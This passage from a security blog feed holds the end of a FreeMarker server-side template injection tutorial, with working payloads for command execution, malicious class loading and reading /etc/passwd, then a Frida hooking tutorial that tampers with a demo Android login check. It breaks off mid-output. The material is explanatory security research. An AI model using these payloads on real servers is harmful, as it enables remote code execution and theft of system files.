exec.getInputStream();</span><br><span class="line">32            Throwable var6 &#x3D; null;</span><br></pre></td></tr></table></figure><p>构造padyload如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;open -a Calculator&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171412511.png" alt="image-20220210171412511"></p><p><strong>利用方法二：</strong></p><p>freemarker.template.utility 里有个 ObjectConstructor 类，通过观察源代码里的第 25 行可以看到这个类会把它的参数作为名称构造一个实例化对象。</p><p>因此也可以利用这一点构造一个可执行命令的对象，从而 RCE</p><p>freemarker.template.utility.ObjectConstructor 部分文件代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17 public class ObjectConstructor implements TemplateMethodModelEx &#123;</span><br><span class="line">18     public ObjectConstructor() &#123;</span><br><span class="line">19     &#125;</span><br><span class="line">20 </span><br><span class="line">21     public Object exec(List args) throws TemplateModelException &#123;</span><br><span class="line">22         if (args.isEmpty()) &#123;</span><br><span class="line">23             throw new TemplateModelException(&quot;This method must have at least one argument, the name of the class to instantiate.&quot;);</span><br><span class="line">24         &#125; else &#123;</span><br><span class="line">25             String classname &#x3D; args.get(0).toString();</span><br><span class="line">26             Class cl &#x3D; null;</span><br><span class="line">27 </span><br><span class="line">28             try &#123;</span><br><span class="line">29                 cl &#x3D; ClassUtil.forName(classname);</span><br><span class="line">30             &#125; catch (Exception var6) &#123;</span><br><span class="line">31                 throw new TemplateModelException(var6.getMessage());</span><br><span class="line">32             &#125;</span><br></pre></td></tr></table></figure><p>构造Payload如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;open&quot;,&quot;-a&quot;,&quot;Calculator&quot;).start()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171630301.png" alt="image-20220210171630301"></p><p><strong>利用方法三：</strong></p><p>freemarker.template.utility 里有个 JythonRuntime 类，这里可以通过自定义标签的方式执行 Python 命令，从而构造远程命令执行。</p><p>freemarker.template.utility.JythonRuntime 部分文件代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class JythonRuntime extends PythonInterpreter</span><br><span class="line">    implements TemplateTransformModel &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Writer getWriter(final Writer out,</span><br><span class="line">                            final Map args) &#123;</span><br><span class="line">        final StringBuilder buf &#x3D; new StringBuilder();</span><br><span class="line">        final Environment env &#x3D; Environment.getCurrentEnvironment();</span><br><span class="line">        return new Writer() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void write(char cbuf[], int off, int len) &#123;</span><br><span class="line">                buf.append(cbuf, off, len);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void flush() throws IOException &#123;</span><br><span class="line">                interpretBuffer();</span><br><span class="line">                out.flush();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void close() &#123;</span><br><span class="line">                interpretBuffer();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            private void interpretBuffer() &#123;</span><br><span class="line">                synchronized (JythonRuntime.this) &#123;</span><br><span class="line">                    PyObject prevOut &#x3D; systemState.stdout;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        setOut(out);</span><br><span class="line">                        set(&quot;env&quot;, env);</span><br><span class="line">                        exec(buf.toString());</span><br><span class="line">                        buf.setLength(0);</span><br><span class="line">                    &#125; finally &#123;</span><br><span class="line">                        setOut(prevOut);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload如下:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;open -a Calculator&quot;)&lt;&#x2F;@value&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171935973.png" alt="image-20220210171935973"></p><h4 id="API函数的利用"><a href="#API函数的利用" class="headerlink" title="API函数的利用"></a>API函数的利用</h4><p>除了 new 函数，还可以利用 api 函数调用 Java API，然后通过 getClassLoader 获取类加载器从而加载恶意类，或者也可以通过 getResource 来实现任意文件读取。</p><p>加载恶意类的 Payload 如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">#assign</span> <span class="attr">classLoader</span>=<span class="string">object?api.class.getClassLoader()</span>&gt;</span>$&#123;classLoader.loadClass(&quot;Evil.class&quot;)&#125;</span><br></pre></td></tr></table></figure><p>任意文件读取的 Payload 如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">#assign</span> <span class="attr">uri</span>=<span class="string">object?api.class.getResource(</span>&quot;/&quot;)<span class="attr">.toURI</span>()&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">#assign</span> <span class="attr">input</span>=<span class="string">uri?api.create(</span>&quot;<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>&quot;)<span class="attr">.toURL</span>()<span class="attr">.openConnection</span>()&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">#assign</span> <span class="attr">is</span>=<span class="string">input?api.getInputStream()</span>&gt;</span></span><br><span class="line">  FILE:[<span class="tag">&lt;<span class="name">#list</span> <span class="attr">0..999999999</span> <span class="attr">as</span> <span class="attr">_</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">#assign</span> <span class="attr">byte</span>=<span class="string">is.read()</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">#if</span> <span class="attr">byte</span> == <span class="string">-1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">#break</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">#if</span>&gt;</span></span><br><span class="line">  $&#123;byte&#125;, <span class="tag">&lt;/<span class="name">#list</span>&gt;</span>]</span><br></pre></td></tr></table></figure><p>不过 api 内建函数并不能随便使用，必须在配置项 apiBuiltinEnabled 为 true 时才有效，而该配置在 2.3.22 版本之后默认为 false</p><p>同时 FreeMarker 为了防御通过其他方式调用恶意方法，FreeMarker 内置了一份危险方法名单 unsafeMethods.properties，例如 getClassLoader、newInstance 等危险方法都被禁用了。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p><a href="https://www.jianshu.com/p/9b39d39d4f42">https://www.jianshu.com/p/9b39d39d4f42</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;模版引擎&quot;&gt;&lt;a href=&quot;#模版引擎&quot; class=&quot;headerlink&quot; title=&quot;模版引擎&quot;&gt;&lt;/a&gt;模版引擎&lt;/h1&gt;&lt;p&gt;模版引擎（这里特指用于Web开发的模版引擎）是为了使用户界面与业务数据(内容)分离而产生的，他可以生成特定格式的文档，利用模版引擎来生成前端的html代码，模版引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模版+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。&lt;/p&gt;
&lt;p&gt;模版引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。&lt;/p&gt;
&lt;h1 id=&quot;SSTI-模版注入&quot;&gt;&lt;a href=&quot;#SSTI-模版注入&quot; class=&quot;headerlink&quot; title=&quot;SSTI(模版注入)&quot;&gt;&lt;/a&gt;SSTI(模版注入)&lt;/h1&gt;&lt;p&gt;SSTI就是服务器端模版注入（Server-Side Template Injection）&lt;/p&gt;
&lt;p&gt;当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的MVC模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给Vier视图层，经过模版渲染展示给 用户。&lt;/p&gt;
&lt;p&gt;漏洞成因就是服务端接收了用户的恶意输入以后，未进过任何处理就将其作为Web应用模版的一部分，模版引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模版的语句，因而可能导致了敏感信息泄露、代码执行、GetShell等问题。其影响范围主要取决于模版引擎的复杂性。&lt;/p&gt;
&lt;p&gt;凡是使用模版的地方都可能会出现SSTI的问题，SSTI不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模版引擎发现了很大的安全漏洞，然后模版引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模块引擎。&lt;/p&gt;
&lt;h2 id=&quot;附表&quot;&gt;&lt;a href=&quot;#附表&quot; class=&quot;headerlink&quot; title=&quot;附表&quot;&gt;&lt;/a&gt;附表&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220120174838082.png&quot; alt=&quot;image-20220120174838082&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SSTI" scheme="http://www.ol4three.com/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>Frida Hook 总结</title>
    <link href="http://www.ol4three.com/2021/12/21/Android/frida/Frida-Hook-%E6%80%BB%E7%BB%93/"/>
    <id>http://www.ol4three.com/2021/12/21/Android/frida/Frida-Hook-%E6%80%BB%E7%BB%93/</id>
    <published>2021-12-21T10:40:00.000Z</published>
    <updated>2022-07-05T07:12:49.873Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida-常用操作总结"><a href="#Frida-常用操作总结" class="headerlink" title="Frida 常用操作总结"></a>Frida 常用操作总结</h1><h2 id="Frida环境"><a href="#Frida环境" class="headerlink" title="Frida环境"></a>Frida环境</h2><p><a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p><h2 id="Pyenv"><a href="#Pyenv" class="headerlink" title="Pyenv"></a>Pyenv</h2><p>python全版本随机切换，这里提供<a href="https://github.com/pyenv/pyenv#homebrew-on-macos">macOS上的配置方法</a></p><h2 id="Frida安装"><a href="#Frida安装" class="headerlink" title="Frida安装"></a>Frida安装</h2><p>如果直接按下述安装则会直接安装frida和frida-tools的最新版本。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install frida-tools</span><br><span class="line">frida --version</span><br><span class="line">frida-ps --version</span><br></pre></td></tr></table></figure><p>我们也可以自由安装旧版本的frida，例如12.8.0</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pyenv install 3.7.7</span><br><span class="line">pyenv local 3.7.7</span><br><span class="line">pip install frida&#x3D;&#x3D;12.8.0</span><br><span class="line">pip install frida-tools&#x3D;&#x3D;5.3.0</span><br></pre></td></tr></table></figure><p>安装objection</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install objection</span><br><span class="line">objection -h</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="Frida开发环境搭建"><a href="#Frida开发环境搭建" class="headerlink" title="Frida开发环境搭建"></a>Frida开发环境搭建</h2><p>安装</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;oleavr&#x2F;frida-agent-example.git</span><br><span class="line">cd frida-agent-example&#x2F;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>npm run watch会监控代码修改自动编译生成js文件</p><p>python脚本或者cli加载_agent.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida -U -f com.example.android --no-pause -l _agent.js</span><br></pre></td></tr></table></figure><p>下面是测试脚本</p><p>s1.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line">    Java.perform(function x() &#123;</span><br><span class="line">        console.log(&quot;ol4three&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p>loader.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line">import frida</span><br><span class="line"></span><br><span class="line">device8 &#x3D; frida.get_device_manager().add_remote_device(&quot;192.168.0.9:8888&quot;)</span><br><span class="line">pid &#x3D; device8.spawn(&quot;com.android.settings&quot;)</span><br><span class="line">device8.resume(pid)</span><br><span class="line">time.sleep(1)</span><br><span class="line">session &#x3D; device8.attach(pid)</span><br><span class="line">with open(&quot;si.js&quot;) as f:</span><br><span class="line">    script &#x3D; session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line">input() #等待输入</span><br></pre></td></tr></table></figure><p>解释一下，这个脚本就是先通过<code>frida.get_device_manager().add_remote_device</code>来找到device,然后spawn方式启动settings，然后attach到上面，并执行frida脚本。</p><h2 id="Frida使用"><a href="#Frida使用" class="headerlink" title="Frida使用"></a>Frida使用</h2><p>查看自己模拟器或者手机架构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure><p>1.下载frida-server并解压</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frida&#x2F;frida&#x2F;releases</span><br></pre></td></tr></table></figure><p>2.运行adb shell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push &#x2F;Users&#x2F;sakura&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida-server-x.x.x-android-arm64 &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">chmod +x frida-server</span><br><span class="line">.&#x2F;frida-server</span><br></pre></td></tr></table></figure><p>如果要监听端口：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frida-server -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure><h1 id="Frida基础"><a href="#Frida基础" class="headerlink" title="Frida基础"></a>Frida基础</h1><h2 id="frida查看当前存在的进程"><a href="#frida查看当前存在的进程" class="headerlink" title="frida查看当前存在的进程"></a>frida查看当前存在的进程</h2><p><code>frida-ps -U</code>查看通过usb连接的android手机上的进程。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ frida-ps --help</span><br><span class="line">Usage: frida-ps [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#39;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -D ID, --device&#x3D;ID    connect to device with the given ID</span><br><span class="line">  -U, --usb             connect to USB device</span><br><span class="line">  -R, --remote          connect to remote frida-server</span><br><span class="line">  -H HOST, --host&#x3D;HOST  connect to remote frida-server on HOST</span><br><span class="line">  -a, --applications    list only applications</span><br><span class="line">  -i, --installed       include all installed applications</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida-ps -H 172.20.10.5:8888</span><br><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>通过grep过滤就可以找到我们想要的包名。</p><h2 id="frida打印参数和修改返回值"><a href="#frida打印参数和修改返回值" class="headerlink" title="frida打印参数和修改返回值"></a>frida打印参数和修改返回值</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.example.frida_demo;</span><br><span class="line"></span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import androidx.appcompat.app.AppCompatActivity;</span><br><span class="line">import android.util.Log;</span><br><span class="line"></span><br><span class="line">public class MainActivity extends AppCompatActivity &#123;</span><br><span class="line"></span><br><span class="line">    private String total &#x3D; &quot;@@@###@@@&quot;;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        while (true)&#123;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                Thread.sleep(1000);</span><br><span class="line">            &#125; catch (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(50,30);</span><br><span class="line">            Log.d(&quot;sakura.string&quot; , fun(&quot;LoWeRcAsE Me!!!!!!!!!&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void fun(int x , int y )&#123;</span><br><span class="line">        Log.d(&quot;sakura.Sum&quot; , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String fun(String x)&#123;</span><br><span class="line">        total +&#x3D;x;</span><br><span class="line">        return x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String secret()&#123;</span><br><span class="line">        return total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main()&#123;</span><br><span class="line">    console.log(&quot;Enter the Script&quot;);</span><br><span class="line">    Java.perform(function x()&#123;</span><br><span class="line">        console.log(&quot;Inside Java perform&quot;);</span><br><span class="line">        var MainActivity &#x3D; Java.use(&#39;com.example.frida_demo.MainActivity&#39;);</span><br><span class="line">        &#x2F;&#x2F;重载找到制定的函数</span><br><span class="line">        MainActivity.fun.overload(&quot;java.lang.String&quot;).implementation &#x3D; function(str)&#123;</span><br><span class="line">            &#x2F;&#x2F;打印参数</span><br><span class="line">            var ret_value &#x3D; &quot;ol4three&quot;;</span><br><span class="line">            return ret_value;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ frida-ps -U | grep com.example.frida_demo</span><br><span class="line">30592  com.example.frida_demo</span><br><span class="line"></span><br><span class="line">╰─$ frida -U -f com.example.frida_demo -l hook_string1.js --no-pause</span><br><span class="line"></span><br><span class="line">╰─$ adb logcat</span><br><span class="line">12-27 18:01:56.002  7041  7041 D ol4three.Sum: 80</span><br><span class="line">12-27 18:01:56.004  7041  7041 D ol4three.string: ol4three</span><br></pre></td></tr></table></figure><h2 id="frida寻找instance，主动调用"><a href="#frida寻找instance，主动调用" class="headerlink" title="frida寻找instance，主动调用"></a>frida寻找instance，主动调用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main()&#123;</span><br><span class="line">    console.log(&quot;Enter the Script&quot;);</span><br><span class="line">    Java.perform(function x()&#123;</span><br><span class="line">        console.log(&quot;Inside Java perform&quot;);</span><br><span class="line">        var MainActivity &#x3D; Java.use(&#39;com.example.frida_demo.MainActivity&#39;);</span><br><span class="line">        &#x2F;&#x2F;重载找到制定的函数</span><br><span class="line">        MainActivity.fun.overload(&quot;java.lang.String&quot;).implementation &#x3D; function(str)&#123;</span><br><span class="line">            &#x2F;&#x2F;打印参数</span><br><span class="line">            var ret_value &#x3D; &quot;ol4three&quot;;</span><br><span class="line">            return ret_value;</span><br><span class="line">        &#125;;</span><br><span class="line">        &#x2F;&#x2F;寻找类型为classname的实例</span><br><span class="line">        Java.choose(&quot;com.example.frida_demo.MainActivity&quot;,&#123;</span><br><span class="line">            onMatch: function(x)&#123;</span><br><span class="line">                console.log(&quot;find instance :&quot; + x);</span><br><span class="line">                console.log(&quot;result of secret func:&quot; + x.secret());</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line">                console.log(&quot;end&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enter the Script</span><br><span class="line">Inside Java perform</span><br><span class="line">find instance :com.example.frida_demo.MainActivity@bb40738</span><br><span class="line">result of secret func:@@@###@@@</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="frida-rpc"><a href="#frida-rpc" class="headerlink" title="frida rpc"></a>frida rpc</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function callFun()&#123;</span><br><span class="line">    Java.perform(function fn()&#123;</span><br><span class="line">        console.log(&#39;begin&#39;);</span><br><span class="line">        Java.choose(&quot;com.example.frida_demo.MainActivity&quot;,&#123;</span><br><span class="line">            onMatch: function(x)&#123;</span><br><span class="line">                console.log(&quot;find instance :&quot; + x);</span><br><span class="line">                console.log(&quot;result of fun(string) func:&quot; + x.fun(Java.use(&quot;java.lang.String&quot;).$new(&quot;space&quot;)));</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line">                console.log(&quot;end&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">rpc.exports &#x3D; &#123;</span><br><span class="line">    callfun : callFun</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import time,frida</span><br><span class="line"></span><br><span class="line">device &#x3D; frida.get_usb_device()</span><br><span class="line">pid &#x3D; device.spawn([&quot;com.example.frida_demo&quot;])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(1)</span><br><span class="line">session &#x3D; device.attach(pid)</span><br><span class="line">with open(&quot;frida_demo_rpc_call.js&quot;) as f:</span><br><span class="line">    script &#x3D; session.create_script(f.read())</span><br><span class="line"></span><br><span class="line">def my_message_handler(message, payload):</span><br><span class="line">    print(message)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">script.on(&quot;message&quot;, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">script.exports.callfun()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python3 frida_rpc_loader.py</span><br><span class="line">begin</span><br><span class="line">find instance :com.example.frida_demo.MainActivity@bb40738</span><br><span class="line">result of fun(string) func:space</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="frida动态修改"><a href="#frida动态修改" class="headerlink" title="frida动态修改"></a>frida动态修改</h2><p>将手机上的app内容发送到PC上的frida 程序，处理后返回给app，然后app在做后续的流程，核心是send/recv函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res&#x2F;android&quot;</span><br><span class="line">    xmlns:app&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res-auto&quot;</span><br><span class="line">    xmlns:tools&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;tools&quot;</span><br><span class="line">    android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">    android:layout_height&#x3D;&quot;match_parent&quot;</span><br><span class="line">    tools:context&#x3D;&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:id&#x3D;&quot;@+id&#x2F;textView&quot;</span><br><span class="line">        android:layout_width&#x3D;&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;wrap_content&quot;</span><br><span class="line">        android:text&#x3D;&quot;please input username and password&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintLeft_toLeftOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintRight_toRightOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;EditText</span><br><span class="line">        android:id&#x3D;&quot;@+id&#x2F;editText&quot;</span><br><span class="line">        android:layout_width&#x3D;&quot;fill_parent&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;48dp&quot;</span><br><span class="line">        android:hint&#x3D;&quot;username&quot;</span><br><span class="line">        android:maxLength&#x3D;&quot;20&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintEnd_toEndOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintHorizontal_bias&#x3D;&quot;1.0&quot;</span><br><span class="line">        app:layout_constraintStart_toStartOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintVertical_bias&#x3D;&quot;0.095&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;EditText</span><br><span class="line">        android:id&#x3D;&quot;@+id&#x2F;editText2&quot;</span><br><span class="line">        android:layout_width&#x3D;&quot;fill_parent&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;48dp&quot;</span><br><span class="line">        android:hint&#x3D;&quot;password&quot;</span><br><span class="line">        android:maxLength&#x3D;&quot;20&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintVertical_bias&#x3D;&quot;0.239&quot;</span><br><span class="line">        tools:ignore&#x3D;&quot;MissingConstraints&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;Button</span><br><span class="line">        android:id&#x3D;&quot;@+id&#x2F;button&quot;</span><br><span class="line">        android:layout_width&#x3D;&quot;100dp&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;48dp&quot;</span><br><span class="line">        android:layout_gravity&#x3D;&quot;right|center_horizontal&quot;</span><br><span class="line">        android:text&#x3D;&quot;提交&quot;</span><br><span class="line">        android:visibility&#x3D;&quot;visible&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintEnd_toEndOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintStart_toStartOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintVertical_bias&#x3D;&quot;0.745&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;androidx.constraintlayout.widget.ConstraintLayout&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MainActivity extends AppCompatActivity &#123;</span><br><span class="line"></span><br><span class="line">    EditText username_et;</span><br><span class="line">    EditText password_et;</span><br><span class="line">    TextView message_tv;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        username_et &#x3D; this.findViewById((R.id.editText));</span><br><span class="line">        password_et &#x3D; this.findViewById(R.id.editText2);</span><br><span class="line">        message_tv &#x3D; this.findViewById(R.id.textView);</span><br><span class="line"></span><br><span class="line">        this.findViewById(R.id.button).setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onClick(View view) &#123;</span><br><span class="line">                if (username_et.getText().toString().compareTo(&quot;admin&quot;) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                    message_tv.setText(&quot;You cannot login as admin&quot;);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;&#x2F;hook target</span><br><span class="line">                message_tv.setText(&quot;Sending to the server :&quot; + android.util.Base64.encodeToString((username_et.getText().toString() + &quot;:&quot; + password_et.getText().toString()).getBytes(StandardCharsets.UTF_8), Base64.DEFAULT));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析一下我们的目的是让message_tv.setText来发送admin的base64字符串。所以我们需要hook TextView.setText这个函数。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211229190444921.png" alt="image-20211229190444921" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python3 frida_demo_rpc_loader2.py</span><br><span class="line">Script loaded successfully</span><br><span class="line">&#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;Sending to the server :ZWVlZWU6MTIzMTIz\n&#39;&#125;</span><br><span class="line">None</span><br><span class="line">Sending to the server :ZWVlZWU6MTIzMTIz</span><br><span class="line"></span><br><span class="line">message: &#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;Sending to the server :ZWVlZWU6MTIzMTIz\n&#39;&#125;</span><br><span class="line">data: b&#39;eeeee:123123&#39;</span><br><span class="line">pw: 123123&#39;</span><br><span class="line">encoded data: 